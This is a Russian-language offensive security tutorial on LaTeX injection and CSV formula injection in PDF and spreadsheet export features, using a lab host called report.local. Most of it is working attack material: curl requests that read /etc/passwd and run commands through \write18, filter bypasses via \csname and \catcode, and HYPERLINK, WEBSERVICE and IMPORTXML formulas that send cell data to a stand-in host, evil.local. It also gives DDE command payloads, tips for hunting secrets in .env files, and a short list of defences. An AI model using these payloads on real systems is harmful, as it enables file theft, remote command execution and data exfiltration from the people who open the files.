## Вопрос, с которого всё начинается

Почти в любом серьёзном веб-приложении есть **экспорт**: счёт в PDF, отчёт в Excel, список заказов в CSV. Разработчик берёт данные пользователя и «подставляет» их в шаблон генератора документа. Кажется, что это безопасно: мы же не пишем в базу, не вызываем shell. Но генератор документа — это **ещё один интерпретатор** со своим языком, и если ввод попадает в него неэкранированным, мы получаем инъекцию.

Сегодня разберём два таких интерпретатора: **LaTeX** (PDF-экспорт) и **табличный формат** (CSV/Excel). Оба дают реальный импакт — от чтения файлов до выполнения команд.

## Наш пример

Есть `report.local` — сервис, который делает PDF-отчёт. Пользователь передаёт своё имя, оно попадает в LaTeX-шаблон и компилируется в PDF:

```bash
$ curl -s 'http://report.local/export?format=pdf&name=Alice'
%PDF-1.4 ... (бинарный PDF)
```

Внутри шаблон примерно такой:

```latex
\documentclass{article}
\begin{document}
Отчёт для: Alice
\end{document}
```

Вопрос: что произойдёт, если в `name` положить не имя, а **команду LaTeX**?

## Шаг 1: LaTeX — это язык, а не разметка

LaTeX — полноценный макроязык. У него есть директивы, которые читают файлы (`\input`, `\include`), вставляют содержимое, задают команды. Ключевая директива — `\input{путь}`: она **вставляет файл** в документ как текст.

```bash
$ curl -s 'http://report.local/export?format=pdf&name=\input{/etc/passwd}'
```

Если сервер не экранировал ввод, в PDF попадёт содержимое `/etc/passwd`. Мы только что получили **чтение произвольного файла** через функцию, которая «просто делает отчёт».

## Шаг 2: от чтения к выполнению команд

Классический LaTeX **не умеет** запускать команды ОС сам по себе. Но у него есть механизм `\write18` — «write to file descriptor 18», который может вызывать внешние программы. Он **выключен по умолчанию**; чтобы он работал, компилятор запускают с флагом `--shell-escape`.

Проверить это можно так:

```bash
$ curl -s 'http://report.local/export?format=pdf&name=\write18{id > /tmp/x}\input{/tmp/x}'
```

Если в PDF окажется `uid=33(www-data)...` — `shell-escape` включён, и мы получили **RCE**. Так выглядит эскалация: чтение файла → выполнение команд. Именно поэтому конфигурацию `pdflatex --shell-escape` считают опасной для генерации пользовательских документов.

## Шаг 3: обход фильтров LaTeX

Если сервер вырезает `\input` или `\write18`, есть обходы:

- **Смена каталога и чтение** через `\lstinputlisting` (пакет listings) — читает файл как листинг кода;
- **Разбиение токенов** через `\catcode` — переопределение категорий символов, чтобы собрать запрещённое слово по кускам;
- **Комментарий и склейка** — `\input` может быть собран из `\csname` и конкатенации.

Главная мысль: фильтр по подстроке бесполезен против макроязыка, у которого есть рефлексия над собственными командами.

## Шаг 4: CSV и формульная инъекция

Теперь второй интерпретатор — **таблица**. Когда приложение выгружает данные в CSV, а пользователь открывает файл в Excel или LibreOffice, ячейка, начинающаяся с `=`, `+`, `-` или `@`, воспринимается как **формула**. Это и есть formula injection (она же CSV injection).

Экспорт:

```bash
$ curl -s 'http://report.local/export?format=csv&name=Alice'
name,amount
Alice,100
```

Подставим формулу в `name`:

```bash
$ curl -s 'http://report.local/export?format=csv&name==HYPERLINK("http://evil.local/?x="&A1,"click")'
```

В CSV попадёт:

```text
=HYPERLINK("http://evil.local/?x="&A1,"click"),100
```

Когда жертва откроет файл, Excel подставит в ссылку **содержимое соседней ячейки** и отправит его на наш сервер. Так утекают данные из отчёта, которые жертва видит, но мы — нет.

## Полный прогон от начала до конца

Смотрим endpoint `?format=pdf&name=...` — видим, что имя попадает в PDF. Пробуем `\input{/etc/passwd}` — в PDF появляется содержимое файла, значит экранирования нет. Проверяем `\write18{...}` — если `shell-escape` включён, получаем выполнение команд. Затем пробуем `?format=csv` с `=HYPERLINK(...)` — Excel-формула уходит в файл. В отчёт идёт цепочка «экспорт → интерпретатор → чтение/RCE/эксфильтрация» с точными запросами.

## Если не сработало

Если `\input` не проходит, проверь, не фильтруется ли обратный слэш — иногда его удваивают. Если `--shell-escape` выключен, остаётся чтение файлов (что уже серьёзно). Если сервер экранирует `\`, `{`, `}` — попробуй другие директивы и `\catcode`-обходы. Для CSV: если Excel не исполняет формулу, попробуй `=cmd|' /C calc'!A0` (DDE) или `@SUM(1+1)*cmd|' /C calc'!A0` — старый DDE-вектор, который иногда ещё срабатывает. И помни: современный Excel предупреждает о внешних ссылках — но данные всё равно утекают через `HYPERLINK`/`WEBSERVICE`.

## Что мы теперь знаем

- Экспорт документа — это интерпретатор, а не «печать текста».
- LaTeX читает файлы директивой `\input` — это чтение произвольных файлов.
- `\write18` + `--shell-escape` превращает чтение в RCE.
- Формулы в CSV/Excel начинаются с `=`, `+`, `-`, `@` — это formula injection.
- `=HYPERLINK`/`WEBSERVICE`/DDE эксфильтруют данные из отчёта.
- Фильтр по подстроке не спасает от макроязыка с рефлексией.

## Инструменты генерации документов

Понять, какой движок у сервера, — половина успеха. Разные движки = разные payloads.

| Движок | Язык | Опасные фичи |
|---|---|---|
| `pdflatex`/`xelatex` | LaTeX | `\write18` + `--shell-escape` |
| `wkhtmltopdf` | HTML→PDF | SSRF, file read через `file://` |
| LibreOffice headless | ODT/DOCX | макросы, DDE |
| `pandoc` | много форматов | `\write18` при LaTeX-выводе |
| Chromium headless | HTML→PDF | SSRF, XSS→PDF |

```bash
$ pdflatex --version | head -1
pdfTeX 3.141592653-2.6-1.40.25 (TeX Live 2023)
$ curl -s 'http://report.local/export?format=pdf&name=test' -o out.pdf
$ pdftotext out.pdf - | head
Отчёт для: test
```

## LaTeX: расширенный арсенал примитивов

`\input` — не единственный способ читать файлы. Полезные примитивы:

```latex
\input{/etc/passwd}                       % вставить файл как текст
\lstinputlisting{/etc/passwd}             % листинг (пакет listings)
\include{/etc/passwd}                     % как \input, но с .tex
\catcode`\%=12 \catcode`\\=12             % снять спец-значение символов
\def\x{\input} \x{/etc/passwd}            % собрать команду из кусков
\csname input\endcsname{/etc/passwd}      % то же через \csname
```

Последние два — прямой ответ на «фильтр по подстроке `\input`»: команду собирают по частям, и статический фильтр её не видит.

## Кейс: RCE через \write18

```bash
$ curl -s 'http://report.local/export?format=pdf&name=\write18{id > /tmp/o}\input{/tmp/o}' -o o.pdf
$ pdftotext o.pdf - | head -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Разбор: `\write18{id > /tmp/o}` выполняет `id` и пишет результат в файл (shell-escape включён), затем `\input{/tmp/o}` вставляет результат в документ. Если shell-escape выключен, `\write18` тихо игнорируется — тогда остаётся чтение файлов, что тоже критично. Проверка «включён ли shell-escape» без RCE:

```bash
$ curl -s 'http://report.local/export?format=pdf&name=\write18{echo YES > /tmp/p}\input{/tmp/p}'
# в PDF появится YES, если escape включён
```

## CSV/Formula: от HYPERLINK к эксфильтрации

Формула исполняется при **открытии** файла в Excel/LibreOffice/Google Sheets. Опасны ячейки, начинающиеся с `=`, `+`, `-`, `@`, а также с TAB/CR (обход «проверки первого символа»).

```text
=HYPERLINK("http://evil.local/?d="&A1&A2,"Открыть")   % exfil соседних ячеек
=WEBSERVICE("http://evil.local/"&B1)                  % запрос без клика
=IMPORTXML("http://evil.local/"&C1,"//x")             % Google Sheets
=cmd|' /C calc'!A0                                    % DDE (старый Excel)
@SUM(1+1)*cmd|' /C calc'!A0                           % DDE-обход фильтра
```

`WEBSERVICE`/`IMPORTXML` особенно коварны: они шлют HTTP-запрос **автоматически** при открытии, без клика, — то есть данные утекают мгновенно.

## Обход фильтров и WAF-варианты

Защита «запретить `=` в начале ячейки» обходится:

- префикс `\t` (TAB) или `\r` перед `=`;
- пробел или `'` перед формулой (в некоторых парсерах всё равно исполняется);
- разделитель-точка с запятой в европейской локали: `=1+1;2`;
- Unicode-пробелы (U+00A0, U+200B) — визуально невидимы, парсер может пропустить.

Для LaTeX обходы — через рефлексию макроязыка (`\catcode`, `\csname`, `\def`), как показано выше; подстроковый WAF тут принципиально слаб. Если `\` удваивают — пробуй `\lstinputlisting` без слэша в имени команды через `\csname`.

## Что делать дальше / решение

План теста: (1) найти функции экспорта (`?format=pdf/csv/xlsx`, `/report`, `/invoice`); (2) определить движок (заголовки, поведение, `pdftotext`); (3) для LaTeX — `\input{/etc/passwd}` (чтение), затем `\write18` (RCE); (4) для CSV — `=HYPERLINK`/`=WEBSERVICE` и проверка эксфильтрации; (5) обойти фильтры (таблица). Защита: **не** запускать LaTeX с `--shell-escape`, экранировать `\ { }` в шаблонах, при экспорте CSV префиксовать опасные ячейки апострофом `'`, использовать безопасные движки и не подставлять пользовательский ввод в шаблон как код.

## Справочная таблица

| Вектор | Payload | Импакт |
|---|---|---|
| LaTeX read | `\input{/etc/passwd}` | чтение файлов |
| LaTeX RCE | `\write18{id}` | выполнение команд |
| LaTeX bypass | `\csname input\endcsname` | обход фильтра |
| CSV exfil | `=HYPERLINK(...&A1,...)` | утечка данных |
| CSV auto | `=WEBSERVICE(...)` | эксфильтрация без клика |
| CSV DDE | `=cmd\|'/C calc'!A0` | RCE у жертвы |

## Практический воркфлоу: PDF-экспорт → RCE

Полный проход от наблюдения к выполнению команд:

```bash
# 1. Находим экспорт и убеждаемся, что ввод попадает в документ.
$ curl -s 'http://report.local/export?format=pdf&name=Alice' -o a.pdf
$ pdftotext a.pdf - | head -1
Отчёт для: Alice

# 2. Чтение файла.
$ curl -s 'http://report.local/export?format=pdf&name=\input{/etc/passwd}' -o b.pdf
$ pdftotext b.pdf - | grep -m1 root
root:x:0:0:root:/root:/bin/bash

# 3. Проверка shell-escape (безобидный маркер).
$ curl -s 'http://report.local/export?format=pdf&name=\write18{echo YES > /tmp/p}\input{/tmp/p}' -o c.pdf
$ pdftotext c.pdf - | head -1
YES

# 4. RCE.
$ curl -s 'http://report.local/export?format=pdf&name=\write18{id > /tmp/o}\input{/tmp/o}' -o d.pdf
$ pdftotext d.pdf - | head -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Если `\write18` выключен, остаётся чтение файлов — ищи секреты (`/app/.env`, `/proc/self/environ`), а также пробуй другие движки (wkhtmltopdf `file://`, Chromium SSRF).

## Сниппеты защитного кода

| Ошибка | Как правильно |
|---|---|
| `pdflatex --shell-escape` | никогда для пользовательских документов |
| подстановка имени в шаблон как есть | экранировать `\ { } $ & # _ % ~ ^` |
| CSV без префикса | префиксовать `'` ячейки, начинающиеся с `= + - @ \t \r` |
| доверие «фильтру по подстроке» | нормализовать и allow-list, а не deny-list |

## Что делать дальше / решение

Сначала докажи **интерпретацию** (файл читается), потом — **эскалацию** (команда исполняется). Не полагайся на `--shell-escape`: даже просто чтение файлов через экспорт — это high/critical (утечка секретов, конфигов). Для CSV подтверди эксфильтрацию реальным запросом на свой слушатель (`nc -lvnp 80`). В отчёт — цепочка «экспорт → интерпретатор → чтение/RCE/exfil» с точными запросами и выводом.

## Куда дальше

Мы увидели, что «безобидные» функции — генерация PDF и выгрузка таблиц — это ещё один слой интерпретации. Дальше логично перейти к тому, как похожие идеи эксплуатируются на уровне **клиента** (CSTI, шаблоны в браузере) и как цепочки собирают несколько мелких багов в критичный импакт.

## Где пригодится

- **CTF (Web):** задачи на «сервис генерации PDF/отчёта» — частый формат.
- **Bug bounty:** функции экспорта в корпоративных приложениях; formula injection в отчётах.
- **Пентест:** аудит генераторов документов (LaTeX, wkhtmltopdf, LibreOffice headless).
- **Работа (AppSec):** запрет `--shell-escape`, экранирование `\` в шаблонах, префикс `'` для ячеек при экспорте CSV.
